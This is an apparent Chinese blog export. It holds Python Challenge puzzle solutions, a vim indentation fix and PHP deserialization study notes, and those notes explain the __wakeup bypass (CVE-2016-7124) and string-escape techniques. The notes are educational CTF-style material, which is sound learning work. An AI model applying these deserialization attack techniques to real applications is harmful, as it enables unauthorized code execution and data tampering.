<p>查询 stack overflow，这个报错的信息是因为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It looks from the response like you didn&#x27;t submit an xml &#x27;request&#x27; document to the url. XMLRPC requires that you post a request in the form of commands via an xml file.</span><br><span class="line"></span><br><span class="line">没有提交 xml 请求。</span><br></pre></td></tr></table></figure></p>
<p>故可以利用 xmlrpc 库请求。</p>
<h2 id="方法-14">方法</h2>
<p>先查看有哪些方法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client  </span><br><span class="line">connect = xmlrpc.client.ServerProxy(<span class="string">&#x27;http://www.pythonchallenge.com/pc/phonebook.php&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(connect.system.listMethods())</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">结果：</span><br></pre></td></tr></table></figure> ['phone', 'system.listMethods', 'system.methodHelp', 'system.methodSignature', 'system.multicall', 'system.getCapabilities'] <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（注意到 `phone`）</span><br><span class="line"></span><br><span class="line">查看 phone 方法的**帮助**和**输入与输出**：</span><br><span class="line">```python</span><br><span class="line">print(connect.system.methodHelp(&#x27;phone&#x27;))  </span><br><span class="line">print(connect.system.methodSignature(&#x27;phone&#x27;))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Returns the phone of a person</span><br><span class="line">[[&#x27;string&#x27;, &#x27;string&#x27;]]</span><br></pre></td></tr></table></figure></p>
<p>该方法需要输入一个字符串，返回一个字符串。那么输入的字符串应该是人名，而返回的字符串应该是对应的电话号码。注意到上一关的 <code>Bert is evil! go back!</code>，那么这里应该输入 <code>Bert</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(connect.phone(<span class="string">&#x27;Bert&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">555-ITALY</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>冷知识：<code>555</code> basically means "fake phone numbers" in US...</p>
</blockquote>
<p>因此修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/disproportional.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/italy.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-14">level 14</h1>
<h2 id="题目信息-14">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203110227.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203110246.png" /></p>
<p>访问 wire.png ，发现真正的尺寸是 10000 * 1。</p>
<p>总结一下信息：</p>
<ol type="1">
<li><code>100*100 = (100+99+99+98) + (...</code></li>
<li>wire.png 是 <code>10000*1</code>，而显示出来的是 <code>100*100</code></li>
<li>HTML 标题为 <code>walk around</code></li>
</ol>
<p>猜测：<strong>将 <code>10000*1</code> 的图片按某种方式卷起来，形成一个 <code>100*100</code> 的图片，卷的方式应该就是 <code>(100+99+99+98) + (..</code>。就是类似这样：</strong> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203111001.png" /> （先向右100，然后向下99，向左99，向上98；向右98 ...）</p>
<h2 id="方法-15">方法</h2>
<p>代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw  </span><br><span class="line">path = <span class="string">&#x27;attachments/level_14/wire.png&#x27;</span>  </span><br><span class="line">img = Image.<span class="built_in">open</span>(path)  </span><br><span class="line"><span class="built_in">print</span>(img.size, img.mode, img.<span class="built_in">format</span>)  </span><br><span class="line">out = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">100</span>, <span class="number">100</span>))  </span><br><span class="line">d = <span class="number">200</span>  </span><br><span class="line">delta = [(<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, -<span class="number">1</span>)]  </span><br><span class="line">x, y, i = -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>  <span class="comment"># 因为第一次要 +100，所以 x 初始为 -1</span></span><br><span class="line"><span class="keyword">while</span> d/<span class="number">2</span> &gt; <span class="number">0</span>:  </span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> delta:  </span><br><span class="line">        steps = d // <span class="number">2</span></span><br><span class="line">		<span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(steps):  </span><br><span class="line">            x, y = x + v[<span class="number">0</span>], y + v[<span class="number">1</span>]  </span><br><span class="line">            out.putpixel((x, y), img.getpixel((i, <span class="number">0</span>)))  </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">		d -= <span class="number">1</span>  </span><br><span class="line">out.show()</span><br></pre></td></tr></table></figure></p>
<p>结果： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220203111203.png" /></p>
<p>当访问 <code>http://www.pythonchallenge.com/pc/return/cat.html</code> 时，出现：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206223856.png" /></p>
<p>因此用 uzi 替代 cat，修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/cat.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/uzi.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-15">level 15</h1>
<h2 id="题目信息-15">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206225138.png" /></p>
<p>查看页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220206225159.png" /></p>
<p>信息总结：</p>
<ol type="1">
<li>日历上显示的应该是 <code>1xx6</code> 年；</li>
<li>注意最右下角的其实是2月，有 29 天，说明应该是闰年；</li>
<li>他不是最年轻的，而是第二年轻的</li>
<li>要做的事：为明天买花</li>
<li>网页标题：<code>whom?</code></li>
</ol>
<p>猜测：需要通过生日找出这个人是谁。</p>
<h2 id="方法-16">方法</h2>
<ol type="1">
<li>找出 1006 到 1996 之间的满足 1.26 是周一的所有闰年。代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime, calendar  </span><br><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1006</span>, <span class="number">1997</span>, <span class="number">10</span>):  </span><br><span class="line">    d = datetime.date(year, <span class="number">1</span>, <span class="number">26</span>)  </span><br><span class="line">    <span class="keyword">if</span> d.isoweekday() == <span class="number">1</span> <span class="keyword">and</span> calendar.isleap(year):  <span class="comment"># 判断是否为闰年，1，26是否为周一</span></span><br><span class="line">        <span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1176-01-26</span><br><span class="line">1356-01-26</span><br><span class="line">1576-01-26</span><br><span class="line">1756-01-26</span><br><span class="line">1976-01-26</span><br></pre></td></tr></table></figure></p>
<p>然后，根据 "他不是最年轻的，而是第二年轻的"，猜测应该是 1756 年，最年轻的是1956年。，再根据"要做的事：为明天买花"，猜测他的生日应该是 1756.1.27，百度发现，那天是莫扎特（Mozart）的生日，修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/return/uzi.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/return/mozart.html</span><br></pre></td></tr></table></figure></p>
<h1 id="附录">附录</h1>
<ol type="1">
<li>网址：<a href="http://www.pythonchallenge.com/">python challenge</a></li>
<li>解法：<a href="https://www.hackingnote.com/en/python-challenge-solutions/overview">python challenge solutions</a></li>
</ol>
]]></content>
      <categories>
        <category>python</category>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>vim缩进问题</title>
    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>记录了关于Linux中vim的缩进问题。</p>
<span id="more"></span>
<h1 id="问题描述">问题描述</h1>
<p>之前有一次编写完脚本运行时，发现不停的报错，信息为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
<p>也就是告诉我缩进出现了错误。可是我检查了好几遍代码，确定不存在这样的缩进错误，于是上网搜索，终于找到了解决方案。</p>
<h1 id="解决方案">解决方案</h1>
<p>首先进入 <code>/etc/vim/vimrc</code>，然后在文件最后加入下面几行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
<p>然后就可以成功运行脚本了。</p>
<p>总结一下就是在vim空格键与制表符不能混用，混用时就会出现报错</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化知识点</title>
    <url>/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<p>个人总结的知识点，持续更新。</p>
<span id="more"></span>
<h1 id="反序列化概念特点">1 反序列化概念、特点</h1>
<h2 id="反序列化概念">1.1 反序列化概念</h2>
<p>序列化就是将对象转换成字符串。字符串包括 <strong>属性名</strong> <strong>属性值</strong> <strong>属性类型</strong>和<strong>该对象对应的类名</strong>。</p>
<p>反序列化则相反将字符串重新恢复成对象。</p>
<p>对象的序列化利于对象的保存和传输,也可以让多个文件共享对象。</p>
<p>如下例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Ctf&quot;</span>:<span class="number">3</span>&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;flag&#123;abedyui&#125;&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Sch0lar&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;18&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">O   代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line"><span class="number">3</span>   代表类名字占三个字符 </span><br><span class="line">ctf 类名</span><br><span class="line"><span class="number">3</span>   代表三个属性</span><br><span class="line">s   代表字符串</span><br><span class="line"><span class="number">4</span>   代表属性名长度</span><br><span class="line">flag属性名</span><br><span class="line">s:<span class="number">13</span>:<span class="string">&quot;flag&#123;abedyui&#125;&quot;</span> 字符串 属性值长度 属性值</span><br></pre></td></tr></table></figure></p>
<h2 id="反序列化特点">1.2 反序列化特点</h2>
<ol type="1">
<li><strong>php在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化</strong> 。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;shy&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lemon</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$lemon</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">序列化结果为：</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>超出的部分不会被发序列化成功，如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;shy&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lemon</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$lemon</span>);</span><br><span class="line">var_dump(unserialize(serialize(<span class="variable">$lemon</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="keyword">object</span>(A)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;shy&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且可以看到反序列化字符串都是以<code>";&#125;</code>结束的，<strong>那如果把<code>";&#125;</code>添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了</strong>。</p>
<ol start="2" type="1">
<li><p><strong>长度不对应的时候会报错</strong> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;shy&quot;;s:4:&quot;pass&quot;;s:6:&quot;12&quot;;&#125;&#x27;</span>;  </span><br><span class="line"><span class="comment">// 注意 s:6:&quot;12&quot; 明显长度不够</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>可以在反序列化类中不存在的元素</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;O:1:&quot;A&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;shy&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;s:5:&quot;pass2&quot;;s:4:&quot;1234&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// 注意要修改A后面的值，要与后面的属性个数对应</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果为：（原来的类中没有pass2这个属性）</span><br><span class="line"><span class="keyword">object</span>(<span class="built_in">__PHP_Incomplete_Class</span>)<span class="comment">#1 (4) &#123;</span></span><br><span class="line">  [<span class="string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;shy&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;123456&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass2&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h1 id="常见的魔术方法">2 常见的魔术方法</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct() 创建对象时调用</span><br><span class="line">__destruct() 销毁对象时调用</span><br><span class="line">__toString() 当一个对象被当作一个字符串使用</span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line">__wakeup 将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
<p>PHP将所有以 <strong><strong><strong> （两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 </strong></strong></strong> 为前缀。</p>
<h2 id="sleep">2.1 <code>__sleep()</code></h2>
<p>在使用 <code>serialize()</code> 函数时，程序会检查类中是否存在一个 <code>__sleep()</code> 魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。</p>
<h2 id="wakeup">2.2 <code>__wakeup</code></h2>
<p>在使用 <code>unserialize()</code> 时，会检查是否存在一个 <code>__wakeup()</code>魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。（注意与 <code>__sleep()</code> 对比）</p>
<h2 id="tostring">2.3 <code>__toString</code></h2>
<p><code>__toString()</code> 方法用于定义一个类被当成字符串时该如何处理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$foo</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$foo</span></span>) 										 	      </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;foo = <span class="variable">$foo</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;foo;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> TestClass(<span class="string">&#x27;Hello&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解释：</p>
<p>这里<code>echo $class;</code>把一个类对象当作字符串变量打印，因此执行了<code>__toSting()</code>，然后返回<code>$this-&gt;foo</code>，即Hello。</p>
<h2 id="invoke">2.4<code>__invoke</code></h2>
<p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。(本特性只在 PHP 5.3.0 及以上版本有效。)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallableClass</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">        var_dump(<span class="variable">$x</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> CallableClass();</span><br><span class="line"><span class="variable">$obj</span>(<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解释：</p>
<p>直接将类对象当作一个函数使用，从而直接调用了<code>__invoke()</code>方法，所以返回结果为<code>int(5)</code></p>
<h2 id="construct">2.5 <code>__construct()</code></h2>
<p>具有<code>__construct()</code>函数的类会在每次创建新对象时先调用此方法，适合在使用对象之前做一些初始化工作。</p>
<h2 id="destruct">2.6 <code>__destruct()</code></h2>
<p><code>__destruct</code>函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</p>
<h2 id="set">2.7 <code>__set()</code></h2>
<p>给不可访问属性赋值时，<code>__set()</code> 会被调用。</p>
<h2 id="get">2.8 <code>__get()</code></h2>
<p>读取不可访问属性的值时，<code>__get()</code> 会被调用。</p>
<h2 id="isset">2.9 <code>__isset()</code></h2>
<p>对不可访问属性调用 <code>__isset()</code> 或 <code>empty()</code> 时，<code>__isset()</code> 会被调用。</p>
<h2 id="unset">2.10 <code>__unset()</code></h2>
<p>对不可访问属性调用 <code>unset()</code>时，<code>__unset()</code> 会被调用。</p>
<h2 id="callstatic">2.10 <code>__callStatic()</code></h2>
<p>在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodTest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">Note:</span> value of $name is case sensitive.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Triggering __call method when calling  method &#x27;<span class="subst">$name</span>&#x27; with arguments &#x27;&quot;</span> . implode(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;&#x27;.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MethodTest::callStaticTest(<span class="string">&#x27;arg3&#x27;</span>,<span class="string">&#x27;arg4&#x27;</span>);  <span class="comment">// As of PHP 5.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">Triggering __call method when calling  method &#x27;callStaticTest&#x27; with arguments &#x27;arg3, arg4&#x27;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="call">2.11 <code>__call()</code></h2>
<p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodTest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">Note:</span> value of $name is case sensitive.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Triggering __call method when calling  method &#x27;<span class="subst">$name</span>&#x27; with arguments &#x27;&quot;</span> . implode(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;&#x27;.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> MethodTest;</span><br><span class="line"><span class="variable">$obj</span>-&gt;callTest(<span class="string">&#x27;arg1&#x27;</span>,<span class="string">&#x27;arg2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">Triggering __call method when calling  method &#x27;callTest&#x27; with arguments &#x27;arg1, arg2&#x27;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="访问控制修饰符">3 访问控制修饰符</h1>
<p>根据访问控制修饰符的不同，序列化后的 <strong>属性长度</strong> 和 <strong>属性值</strong> 会有所不同。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>(公有)</span><br><span class="line"><span class="keyword">protected</span>(受保护)</span><br><span class="line"><span class="keyword">private</span>(私有的)</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> 属性被序列化的时候属性名会变成：%<span class="number">00</span>*%<span class="number">00</span>属性名</span><br><span class="line"><span class="keyword">private</span> 属性被序列化的时候属性名会变成：%<span class="number">00</span>类名%<span class="number">00</span>属性名</span><br><span class="line"></span><br><span class="line">注意：这里的%<span class="number">00</span>其实是\<span class="number">0</span>经过urlencode得到的，而\<span class="number">0</span>长度是<span class="number">1</span>，所以%<span class="number">00</span>的长度也是<span class="number">1</span>，切记！！！可以数下面例子的长度。</span><br></pre></td></tr></table></figure></p>
<p>like this: <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;<span class="comment">//这里是private属性被序列化</span></span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;ctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;%00*%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;%00*%00cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;&#125;<span class="comment">//这里是protected属性被序列化</span></span><br></pre></td></tr></table></figure></p>
<p>注意：<code>var</code> 为 <code>public</code> 的别名。php中必须使用这三个修饰符，如果没有，则必须使用 <code>var</code> 代替 <code>pubic</code>。</p>
<p>如果不想复制的时候没复制到不可见字符，可以将得到的字符串进行url编码！[[MRCTF2020 Ezpop]]</p>
<h1 id="绕过-__wakeup-函数">4 绕过 __wakeup() 函数</h1>
<p>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。该方法和__sleep()相反，前者使用serialize()时自动调用，后者当使用 unserialize() 时自动调用。</p>
<p>该方法有一个漏洞(CVE-2016-7124)，只需要序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过执行。</p>
<h1 id="字符串逃逸">5 字符串逃逸</h1>
<p>原理：先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。</p>
<p>有两种情况：</p>
<ol type="1">
<li>过滤后字符变多</li>
<li>过滤后字符变少</li>
</ol>
<h2 id="过滤后字符变多">5.1 过滤后字符变多</h2>
<p>假设定义如下一个类： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_ser</span>;</span><br><span class="line"></span><br><span class="line">结果为：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
